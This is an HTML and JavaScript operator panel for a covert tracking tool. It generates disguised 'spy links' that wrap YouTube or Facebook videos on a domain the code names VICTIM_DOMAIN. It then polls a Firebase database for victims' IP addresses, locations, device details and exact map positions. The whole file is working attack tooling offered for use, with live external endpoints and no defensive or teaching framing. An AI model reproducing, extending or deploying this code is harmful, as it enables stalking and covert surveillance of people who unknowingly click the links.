<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MA LEGEND | SUPREME ADMIN</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
        body { background: #121212; color: #eee; font-family: 'Poppins', sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .card { background: #1e1e1e; padding: 25px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 20px; }
        h1 { font-family: 'Orbitron'; color: #00ffcc; text-align: center; font-size: 1.2rem; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #000; color: #00ffcc; outline: none; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; border: none; border-radius: 12px; background: #00ffcc; color: #000; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; transition: 0.3s; margin-top: 10px; }
        .btn:active { transform: scale(0.98); }
        .log-box { background: #181818; padding: 15px; border-radius: 12px; border-left: 4px solid #00ffcc; margin-top: 15px; font-size: 0.8rem; line-height: 1.6; animation: fadeIn 0.5s ease; }
        .log-box b { color: #00ffcc; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>MA LEGEND CONTROL</h1>
            <input type="text" id="userKey" placeholder="Enter Your Secret Key (e.g. Legend786)">
            <input type="text" id="targetUrl" placeholder="Paste Video Link (YouTube/FB)">
            <button class="btn" onclick="generate()">GENERATE SPY LINK</button>
            
            <div id="result" style="display:none; margin-top:20px;">
                <input type="text" id="finalLink" readonly>
                <button class="btn" style="background:#333; color:#fff;" onclick="copy()">COPY LINK</button>
            </div>
        </div>

        <div id="logsContainer">
            <p style="text-align:center; color:#666;">Waiting for logs... Enter key to see activity.</p>
        </div>
    </div>

    <script>
        // Aapka Naya Firebase URL
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/users/";
        const VICTIM_DOMAIN = "https://video-obtg.vercel.app/";

        function generate() {
            const key = document.getElementById('userKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim();
            if(!key || !url) return alert("Fill all fields!");
            const encoded = btoa(key + "|" + url);
            document.getElementById('finalLink').value = VICTIM_DOMAIN + "?id=" + encoded;
            document.getElementById('result').style.display = 'block';
        }

        function copy() {
            const link = document.getElementById('finalLink');
            link.select();
            document.execCommand("copy");
            alert("Link Copied!");
        }

        async function fetchLogs() {
            const key = document.getElementById('userKey').value.trim();
            if(!key) return;
            try {
                const res = await fetch(`${DB_URL}${key}.json`);
                const data = await res.json();
                const container = document.getElementById('logsContainer');
                
                if(!data) return;
                container.innerHTML = `<h3 style="color:#888; font-size:0.9rem;">Live Logs for: ${key}</h3>`;
                Object.keys(data).reverse().forEach(id => {
                    const l = data[id];
                    container.innerHTML += `
                        <div class="log-box">
                            <b>üïí Time:</b> ${l.time}<br>
                            <b>üåê IP:</b> ${l.ip} | <b>üìç Loc:</b> ${l.loc}<br>
                            <b>üì± Device:</b> ${l.dev}<br>
                            <b>üß† Hardware:</b> ${l.cpu} Core | ${l.ram}GB RAM<br>
                            <a href="${l.map}" target="_blank" style="color:#00ffcc;">üìç View Exact Location on Map</a>
                        </div>`;
                });
            } catch(e) {}
        }
        setInterval(fetchLogs, 4000);
    </script>
</body>
</html>
